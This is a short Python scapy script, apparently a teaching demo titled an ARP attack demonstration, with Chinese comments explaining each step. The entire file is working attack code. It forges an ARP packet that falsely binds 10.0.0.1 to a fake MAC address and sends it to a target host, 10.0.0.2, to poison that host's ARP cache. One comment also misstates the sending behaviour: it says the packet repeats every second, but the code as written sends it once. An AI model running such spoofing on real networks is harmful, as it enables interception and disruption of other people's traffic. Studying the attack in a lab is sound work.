#!/usr/bin/python3
# -*- coding: utf-8 -*-
# ARP攻擊演示腳本/arpDemo.py


from scapy.all import (
    Ether,
    ARP,
    sendp
)
# 注意這裏面的幾個方法
# Ether用來構建以太網數據包
# ARP是構建ARP數據包的類
# sendp方法在第二層發送數據包

# Ether用來構建以太網數據包
eth = Ether()
arp = ARP(
    # 代表ARP請求
    op="who-has",

    # 發送方Mac地址
    hwsrc="00:00:00:00:00:01",
    # 發送方IP地址
    psrc="10.0.0.1",

    # 目標Mac地址/被欺騙主機MAC
    hwdst="ff:ff:ff:ff:ff:ff",
    # 目標IP地址/被欺騙主機IP地址
    pdst="10.0.0.2"
)
# scapy重載了"/"操作符，可以用來表示兩個協議層的組合
# 這裏我們輸出一下數據包的結構信息
print((eth/arp).show())

# 發送封包，並且每間隔1秒重複發送
sendp(eth/arp, inter=2, loop=0)